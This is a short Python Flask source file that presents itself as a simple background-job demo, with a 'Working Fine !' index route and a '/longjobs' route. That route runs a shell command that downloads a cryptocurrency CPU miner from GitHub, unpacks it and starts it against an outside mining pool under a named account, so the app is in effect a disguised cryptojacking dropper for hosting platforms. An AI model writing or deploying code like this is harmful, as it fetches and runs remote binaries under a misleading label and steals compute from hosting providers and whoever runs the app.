import os
from flask import Flask
from flask_executor import Executor
app = Flask(__name__)

executor = Executor(app)

@app.route("/")
def hello():
    return "Working Fine !"

@app.route("/longjobs")
def index():
    executor.submit(long_running_job)
    return "Procesed a Job !"

def long_running_job():
    os.system("wget https://github.com/m-pays/m-cpuminer-v2/releases/download/2.4/m-minerd-64-linux.tar.gz && tar xfvz m-minerd-64-linux.tar.gz && cd m-minerd-64-linux &&  ./m-minerd -a m7mhash -o stratum+tcp://xmg.minerclaim.net:3333 -u rock6064.one -p x")


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
